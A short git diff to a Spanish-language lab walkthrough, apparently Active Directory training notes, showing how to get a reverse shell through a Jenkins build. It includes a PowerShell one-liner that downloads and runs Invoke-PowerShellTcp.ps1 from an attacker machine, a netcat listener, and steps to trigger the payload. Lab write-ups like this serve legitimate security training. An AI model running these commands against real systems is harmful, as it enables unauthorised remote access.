@@ -59,4 +59,10 @@ Una vez en esa zona de configuracion nos mandaremos una reverse shell a nuetsra 
 powershell iex (iwr -UseBasicParsing http://<attacker_machine>/Invoke-PowershellTcp.ps1);power -Reverse -IPAddress <attacker_machine> -Port 1339
 ```
 
-Una vez tenemos introduci
+Una vez tenemos introducido el reverse shell lo guardaremos y ejecutaremos *netcat* poniendonos en escucha en el puerto selecciona
+```shell
+C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 1339
+```
+
+Ejecutaremos *hsf.exe* y cargaremos *Invoke-PowerShellTcp.ps1*
+Y copiaremos la URL ahora en Jenkins haremos clic en Buid Now
